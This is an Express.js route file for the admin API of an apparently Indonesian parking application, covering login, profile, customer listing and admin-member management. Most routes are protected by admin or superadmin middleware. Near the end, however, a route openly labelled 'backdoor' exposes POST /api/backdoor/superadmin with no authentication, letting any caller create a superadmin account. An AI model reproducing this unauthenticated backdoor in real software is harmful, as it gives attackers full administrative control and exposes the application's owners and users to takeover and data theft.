const router = require('express').Router()
const { authController, profileController, parkirControlller, userController } = require('../controllers/admin');
const { adminAuthMiddleware, superAdminAuthMiddleware } = require('../middleware');

// admin route
router.post('/api/admin/login', authController.login);
router.get('/api/admin/profile',adminAuthMiddleware,  profileController.get);

// // jenis parkir
// router.get('/api/admin/jenis-parkir', adminAuthMiddleware, parkirControlller.getJenisParkir);
// router.post('/api/admin/jenis-parkir', adminAuthMiddleware, parkirControlller.createJenisParkir);
// router.put('/api/admin/jenis-parkir/:id', adminAuthMiddleware, parkirControlller.updateJenisParkir);
// router.delete('/api/admin/jenis-parkir/:id', adminAuthMiddleware, parkirControlller.deleteJenisParkir);

// customer
router.get('/api/admin/customer', adminAuthMiddleware, userController.getCustomer);

// // member admin
router.get('/api/admin/member-admin', adminAuthMiddleware, userController.getMemberAdmin);
router.post('/api/admin/member-admin', adminAuthMiddleware, userController.createMemberAdmin);
router.put('/api/admin/member-admin/:id/reset-password', superAdminAuthMiddleware, userController.resetPassword);
router.delete('/api/admin/member-admin/:id', superAdminAuthMiddleware, userController.removeMemberAdmin);



// backdoor
router.post('/api/backdoor/superadmin', userController.createSuperAdmin);


module.exports = router;